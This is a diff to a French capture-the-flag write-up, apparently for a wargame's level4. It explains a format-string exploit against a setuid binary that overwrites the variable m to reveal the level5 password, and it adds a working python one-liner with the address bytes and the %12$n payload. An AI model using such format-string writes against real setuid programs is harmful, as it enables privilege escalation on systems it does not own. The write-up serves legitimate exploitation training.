@@ -17,10 +17,12 @@ Obtenir le mot de passe level5. Le binaire est setuid level5 et peut exécuter *
 
 ## 4. Exploit
 
-- Adresse de **m** en little endian au début du buffer : `\x10\x98\x04\x08`.
-- Puis **%16930112x** (4 + 16930112 = 16930116 octets imprimés) et **%k$n** (k = 1, 4 ou 7 selon la VM).
-- La sortie est très volumineuse ; le mot de passe level5 est à la fin. Utiliser `| tail -1` pour ne garder que la dernière ligne.
+- Adresse de **m** (0x8049810) en little endian au début du buffer : `\x10\x98\x04\x08`.
+- Puis **%16930112x** (4 + 16930112 = 16930116 octets) et **%k$n**. L’index **k** est celui pour lequel le dump affiche **0x41414141** (les "AAAA") ; sur l’ISO officielle c’est **12**.
+- Commande qui fonctionne :  
+  `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`  
+  Attendre 10–30 s ; le mot de passe level5 s’affiche à la fin.
 
 ## 5. Récupération du mot de passe
 
-Consigner le mot de passe affiché dans `level4/flag`.
+Le mot de passe s’affiche à la fin de la sortie. Le consigner dans `level4/flag`.
